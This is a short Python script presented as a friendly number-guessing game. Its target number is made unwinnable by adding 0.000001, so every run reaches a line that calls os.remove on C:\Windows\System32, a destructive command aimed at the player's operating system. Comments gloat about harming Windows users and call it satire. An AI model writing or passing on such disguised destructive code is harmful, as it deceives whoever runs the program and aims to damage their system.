import random
import os
from time import sleep

number = random.randint(1, 10) + 0.000001

guess = input("Hey there! Let's play a fun game :D Guess a number between 1 and 10: ")
guess = int(guess)

if guess == number:
  print("Congratulations! You won! And, you also avoided death...")
else:
  os.remove("C:\Windows\System32") # bye bye 😈
 

# im om mac so its funny how my code only affects windows users lmao
# switch to macbook idiots!  (this is satire) 
